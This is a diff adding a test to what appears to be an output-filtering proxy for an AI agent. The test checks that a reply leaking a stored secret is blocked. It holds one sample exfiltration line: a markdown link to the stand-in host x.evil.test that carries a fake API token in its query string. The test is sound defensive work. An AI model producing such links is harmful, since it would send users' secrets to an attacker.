@@ -101,3 +101,19 @@ def test_default_app_enables_judge_when_key_is_set(monkeypatch) -> None:
     finally:
         monkeypatch.delenv('MODEL_API_KEY', raising=False)
         importlib.reload(proxy)
+
+
+def test_check_output_endpoint_blocks_leaking_link(client: TestClient) -> None:
+    session_id = open_session(client)
+    client.post('/sessions/' + session_id + '/ingest', json={
+        'text': 'token sk-live-ab12CD34ef56', 'source': 'tool:search',
+        'sensitive': True,
+    })
+
+    reply = client.post('/sessions/' + session_id + '/check-output', json={
+        'text': '[go](https://x.evil.test/?k=sk-live-ab12CD34ef56)',
+    })
+
+    assert reply.status_code == 200
+    assert reply.json()['verdict'] == 'block'
+    assert 'sk-live' not in reply.json()['safe_text']
